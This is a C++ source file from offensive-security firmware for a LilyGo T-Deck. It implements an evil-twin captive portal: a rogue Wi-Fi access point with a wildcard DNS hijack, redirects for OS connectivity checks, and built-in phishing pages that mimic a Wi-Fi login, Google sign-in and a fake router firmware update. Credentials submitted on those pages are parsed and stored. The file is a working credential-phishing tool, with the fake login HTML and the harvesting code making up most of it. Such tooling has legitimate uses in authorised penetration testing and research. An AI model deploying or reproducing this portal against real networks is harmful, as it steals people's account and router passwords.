// T-REX — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// Field-agnostic captive portal. Patterns adapted from the EvilTwin portal so
// karma/responder/apbridge can share one implementation.

#include "captive_portal.h"
#include "display_manager.h"
#include "input_handling.h"
#include <WiFi.h>
#include <SD.h>
#include <strings.h>   // strcasecmp

extern DisplayManager displayManager;
extern InputHandling  inputHandler;

static const IPAddress CP_IP(192, 168, 4, 1);
static const IPAddress CP_NM(255, 255, 255, 0);

// One portal runs at a time; client count comes from AP events (captureless
// lambdas can't reach the instance, so it lives here — same as eviltwin).
static volatile int s_cpClients = 0;

// ── Built-in templates (shared) ───────────────────────────────────────────────
static const char CP_GENERIC[] = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1"><title>WiFi Login</title>
<style>body{font-family:Arial,sans-serif;background:#f2f2f2;margin:0}
.c{max-width:400px;margin:60px auto;padding:32px;background:#fff;border-radius:10px;
box-shadow:0 2px 10px rgba(0,0,0,.1)}h1{font-size:22px;color:#222;text-align:center;margin:0 0 6px}
p{font-size:14px;color:#666;text-align:center;margin:0 0 22px}
input{width:100%;box-sizing:border-box;padding:13px;margin:8px 0;border:1px solid #ccc;
border-radius:5px;font-size:15px}button{width:100%;padding:13px;margin-top:14px;background:#1a73e8;
color:#fff;border:none;border-radius:5px;font-size:15px;cursor:pointer}</style></head><body>
<div class="c"><h1>Sign in to WiFi</h1><p>Verify your account to access the internet</p>
<form method="POST" action="/post">
<input type="email" name="user" placeholder="Email" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Connect</button></form></div></body></html>)rawliteral";

// Google + Router adapted from Bruce firmware (evil_portal.cpp), AGPL-3.0.
static const char CP_GOOGLE[] = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>body{font-family:Roboto,arial,sans-serif;background:#fff;margin:0}
.c{max-width:450px;margin:80px auto;padding:40px;border:1px solid #dadce0;border-radius:8px}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
.sub{font-size:16px;color:#202124;text-align:center;margin-bottom:24px}
input{width:100%;box-sizing:border-box;padding:14px;margin:8px 0 20px;
border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none}
.btn{background:#1a73e8;color:#fff;border:none;padding:14px 24px;
border-radius:4px;font-size:14px;cursor:pointer;float:right}
.logo{text-align:center;margin-bottom:24px;font-size:32px;font-weight:300}</style></head><body>
<div class="c"><div class="logo">
<span style="color:#4285F4">G</span><span style="color:#EA4335">o</span>
<span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span>
<span style="color:#34A853">l</span><span style="color:#EA4335">e</span></div>
<h1>Sign in</h1><p class="sub">Use your Google Account</p>
<form method="POST" action="/post">
<input type="email" name="user" placeholder="Email or phone" required>
<input type="password" name="pass" placeholder="Enter your password" required>
<div style="overflow:hidden"><button type="submit" class="btn">Next</button></div>
</form></div></body></html>)rawliteral";

static const char CP_ROUTER[] = R"rawliteral(<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Firmware Update</title>
<style>body{font-family:Arial,sans-serif;background:#f0f0f0;margin:0}
.box{max-width:480px;margin:60px auto;background:#fff;border-radius:8px;
padding:32px;box-shadow:0 2px 8px rgba(0,0,0,.15)}
h2{color:#cc0000;margin-top:0;font-size:22px}
.warn{background:#fff3cd;border:1px solid #ffc107;border-radius:4px;
padding:12px;margin-bottom:20px;font-size:14px;color:#856404}
label{display:block;margin-bottom:4px;font-size:14px;font-weight:bold;color:#333}
input{width:100%;box-sizing:border-box;padding:10px;margin-bottom:16px;
border:1px solid #ccc;border-radius:4px;font-size:15px}
.btn{background:#cc0000;color:#fff;border:none;padding:12px 32px;
border-radius:4px;font-size:15px;cursor:pointer;width:100%}
.foot{text-align:center;margin-top:16px;font-size:12px;color:#888}</style></head><body>
<div class="box"><h2>&#9888; Security Update Required</h2>
<div class="warn"><b>Notice:</b> Your router requires a critical firmware update to patch
a security vulnerability. Please verify your admin credentials to continue.</div>
<form method="POST" action="/post">
<label>Admin Username</label><input type="text" name="user" placeholder="admin" required>
<label>Admin Password</label><input type="password" name="pass" placeholder="Enter password" required>
<button type="submit" class="btn">Verify &amp; Update</button></form>
<p class="foot">Router Management Portal &bull; Firmware v3.1.2</p></div></body></html>)rawliteral";

static const struct { const char* name; const char* html; } CP_BUILTINS[] = {
    { "Generic WiFi", CP_GENERIC },
    { "Google",       CP_GOOGLE  },
    { "Router Update",CP_ROUTER  },
};
int         cpBuiltinCount()        { return (int)(sizeof(CP_BUILTINS) / sizeof(CP_BUILTINS[0])); }
const char* cpBuiltinName(int idx)  { return (idx >= 0 && idx < cpBuiltinCount()) ? CP_BUILTINS[idx].name : "?"; }

void CaptivePortal::useBuiltin(int idx) {
    if (idx < 0 || idx >= cpBuiltinCount()) return;
    _htmlStore = "";
    _html = CP_BUILTINS[idx].html;
}

// ── field-name classification (portals disagree on input names) ────────────────
static inline bool cpHas(const String& s, const char* k) { return s.indexOf(k) >= 0; }
static bool cpIsPass(const String& s) {
    return cpHas(s,"pass")||cpHas(s,"pwd")||cpHas(s,"psw")||cpHas(s,"passcode")||s=="pin";
}
static bool cpIsUser(const String& s) {
    return cpHas(s,"email")||cpHas(s,"user")||cpHas(s,"login")||cpHas(s,"uname")||
           cpHas(s,"account")||cpHas(s,"phone")||cpHas(s,"mobile")||cpHas(s,"identifier")||
           s=="id"||s=="name"||s=="tel";
}
static bool cpIsIgnore(const String& s) {
    return cpHas(s,"remember")||cpHas(s,"token")||cpHas(s,"csrf")||cpHas(s,"captcha")||
           cpHas(s,"submit")||cpHas(s,"button")||cpHas(s,"viewport")||cpHas(s,"hidden");
}

bool CaptivePortal::begin(const char* ssid, bool open, const char* psk, uint8_t channel) {
    _credCount = 0; _lastUser[0] = _lastPass[0] = '\0'; s_cpClients = 0;
    if (!_html) _html = CP_GENERIC;

    WiFi.disconnect(false);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(CP_IP, CP_IP, CP_NM);
    bool ok = open ? WiFi.softAP(ssid)
                   : WiFi.softAP(ssid, psk, channel, 0, 4, false);
    delay(200);

    _evConn = WiFi.onEvent([](WiFiEvent_t, WiFiEventInfo_t){ s_cpClients++; },
                           ARDUINO_EVENT_WIFI_AP_STACONNECTED);
    _evDisc = WiFi.onEvent([](WiFiEvent_t, WiFiEventInfo_t){ if (s_cpClients > 0) s_cpClients--; },
                           ARDUINO_EVENT_WIFI_AP_STADISCONNECTED);

    _dns.start(53, "*", CP_IP);
    routes();
    _srv.begin();
    return ok;
}

bool CaptivePortal::loadTemplate(const char* sdPath) {
    _htmlStore = "";
    File f = SD.open(sdPath, FILE_READ);
    if (!f) return false;
    _htmlStore = f.readString();
    f.close();
    if (_htmlStore.length() == 0) return false;
    _html = _htmlStore.c_str();        // valid for this object's lifetime
    return true;
}

void CaptivePortal::poll() {
    _dns.processNextRequest();
    _srv.handleClient();
}

void CaptivePortal::end() {
    _srv.stop();
    _dns.stop();
    WiFi.removeEvent(_evConn);
    WiFi.removeEvent(_evDisc);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    delay(50);
}

int CaptivePortal::clients() const { return s_cpClients; }

void CaptivePortal::handleRedirect() {
    _srv.sendHeader("Location", "http://192.168.4.1/");
    _srv.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    _srv.sendHeader("Captive-Portal-URL", "http://192.168.4.1/");
    _srv.send(302, "text/html",
        "<html><head><meta http-equiv='refresh' content='0;url=http://192.168.4.1/'></head>"
        "<body><a href='http://192.168.4.1/'>Open portal</a></body></html>");
}

void CaptivePortal::handleRoot() {
    _srv.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    _srv.sendHeader("Captive-Portal-URL", "http://192.168.4.1/");
    _srv.send(200, "text/html", _html);
}

bool CaptivePortal::captureArgs() {
    String user, pass;
    int n = _srv.args();
    for (int i = 0; i < n; i++) {
        String nm = _srv.argName(i);
        if (nm == "plain") continue;
        String val = _srv.arg(i);
        if (!val.length()) continue;
        String ln = nm; ln.toLowerCase();
        if      (!pass.length() && cpIsPass(ln)) pass = val;
        else if (!user.length() && cpIsUser(ln)) user = val;
    }
    if (pass.length() && !user.length()) {            // fallback: first non-junk field
        for (int i = 0; i < n; i++) {
            String nm = _srv.argName(i);
            if (nm == "plain") continue;
            String val = _srv.arg(i);
            if (!val.length()) continue;
            String ln = nm; ln.toLowerCase();
            if (cpIsPass(ln) || cpIsIgnore(ln)) continue;
            user = val; break;
        }
    }
    if (!user.length() && !pass.length()) return false;
    strncpy(_lastUser, user.c_str(), 47); _lastUser[47] = '\0';
    strncpy(_lastPass, pass.c_str(), 47); _lastPass[47] = '\0';
    if (_credCount < CP_MAX_CREDS) {
        strncpy(_creds[_credCount].user, user.c_str(), 47); _creds[_credCount].user[47] = '\0';
        strncpy(_creds[_credCount].pass, pass.c_str(), 47); _creds[_credCount].pass[47] = '\0';
    }
    _credCount++;
    return true;
}

void CaptivePortal::handleCapture() { captureArgs(); handleRedirect(); }

void CaptivePortal::routes() {
    _srv.on("/",     HTTP_GET, [this]() { handleRoot();   });
    _srv.on("/post", HTTP_ANY, [this]() { handleCapture(); });
    _srv.on("/get",  HTTP_ANY, [this]() { handleCapture(); });
    auto redir = [this]() { handleRedirect(); };
    _srv.on("/generate_204",        HTTP_GET, redir);
    _srv.on("/gen_204",             HTTP_GET, redir);
    _srv.on("/hotspot-detect.html", HTTP_GET, redir);
    _srv.on("/ncsi.txt",            HTTP_GET, redir);
    _srv.on("/connecttest.txt",     HTTP_GET, redir);
    _srv.on("/canonical.html",      HTTP_GET, redir);
    _srv.onNotFound([this]() { handleCapture(); });
}

// ── Shared template picker (built-ins + SD .html in sdDir) ─────────────────────
bool cpPickTemplate(const char* sdDir, CpChoice& out) {
    DisplayManager& dm = displayManager;

    static const int MAXE = 32;
    struct Ent { char label[26]; int builtin; char path[88]; };
    static Ent ents[MAXE];                      // static: keep off the small task stack
    int n = 0;

    for (int i = 0; i < cpBuiltinCount() && n < MAXE; i++) {
        snprintf(ents[n].label, sizeof(ents[n].label), "%s", cpBuiltinName(i));
        ents[n].builtin = i; ents[n].path[0] = '\0'; n++;
    }
    File dir = SD.open(sdDir);
    if (dir && dir.isDirectory()) {
        for (File f = dir.openNextFile(); f && n < MAXE; f = dir.openNextFile()) {
            if (!f.isDirectory()) {
                const char* nm = f.name();
                const char* base = strrchr(nm, '/'); base = base ? base + 1 : nm;
                size_t L = strlen(base);
                bool html = (L >= 5 && strcasecmp(base + L - 5, ".html") == 0) ||
                            (L >= 4 && strcasecmp(base + L - 4, ".htm")  == 0);
                if (html) {
                    snprintf(ents[n].label, sizeof(ents[n].label), "%s", base);
                    ents[n].builtin = -1;
                    snprintf(ents[n].path, sizeof(ents[n].path), "%s/%s", sdDir, base);
                    n++;
                }
            }
            f.close();
        }
    }
    if (dir) dir.close();

    int page = 0;
    const int PER = 8;
    while (true) {
        int totalPages = (n + PER - 1) / PER; if (totalPages == 0) totalPages = 1;
        if (page >= totalPages) page = totalPages - 1;

        dm.clearScreen();
        dm.setDefaultTextSize();
        dm.setCursor(4, outputY);
        dm.setTextColor(0x7BEF);    dm.printText("[");
        dm.setTextColor(TFT_CYAN);  dm.printText("PORTAL");
        dm.setTextColor(0x7BEF);    dm.printText("::");
        dm.setTextColor(TFT_YELLOW);dm.printText("PICK");
        dm.setTextColor(0x7BEF);    dm.printText("]  ");
        char pg[8]; snprintf(pg, sizeof(pg), "%02d/%02d", page + 1, totalPages);
        dm.println(pg);
        dm.printSeparator();

        int start = page * PER, end = start + PER < n ? start + PER : n;
        for (int i = start; i < end; i++) {
            dm.setCursor(4, dm.getCursorY());
            dm.setTextColor(ents[i].builtin >= 0 ? TFT_WHITE : TFT_CYAN);
            char line[40];
            snprintf(line, sizeof(line), "[%d] %.30s%s", i - start + 1, ents[i].label,
                     ents[i].builtin >= 0 ? "" : " (SD)");
            dm.println(line);
        }
        dm.printSeparator();
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(0x7BEF);
        dm.println("1-8 pick  a/l page  q cancel");

        while (true) {
            char k = inputHandler.getKeyboardInput();
            if (k == 'q' || k == 'Q') return false;
            if ((k == 'l' || k == 'L') && page < totalPages - 1) { page++; break; }
            if ((k == 'a' || k == 'A') && page > 0)              { page--; break; }
            if (k >= '1' && k <= '8') {
                int idx = start + (k - '1');
                if (idx < end) {
                    out.builtin = ents[idx].builtin;
                    strncpy(out.sdPath, ents[idx].path, sizeof(out.sdPath) - 1);
                    out.sdPath[sizeof(out.sdPath) - 1] = '\0';
                    return true;
                }
            }
            vTaskDelay(pdMS_TO_TICKS(15));
        }
    }
}
